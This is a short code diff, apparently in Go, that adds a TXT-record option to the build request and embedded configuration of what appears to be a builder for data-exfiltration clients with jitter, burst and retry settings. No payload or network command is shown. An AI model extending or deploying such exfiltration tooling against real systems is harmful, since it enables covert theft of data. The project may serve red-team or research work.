@@ -311,6 +311,7 @@ type ExfilClientBuildRequest struct {
 	Platform       string   `json:"platform"`
 	Architecture   string   `json:"architecture"`
 	StaticLink     bool     `json:"static_link"`
+	UseTxtRecords  bool     `json:"use_txt_records"`
 }
 
 // Web UI handler for builder page
@@ -1450,6 +1451,7 @@ func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKe
 	burst_pause_ms: %d,
 	chunk_retry_attempts: default_chunk_retry_attempts(),
 	chunk_retry_delay_ms: default_chunk_retry_delay_ms(),
+	use_txt_records: %t,
 });
 
 `,
@@ -1462,6 +1464,7 @@ func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKe
 		req.JitterMaxMs,
 		req.ChunksPerBurst,
 		req.BurstPauseMs,
+		req.UseTxtRecords,
 	)
 
 	content := string(data)
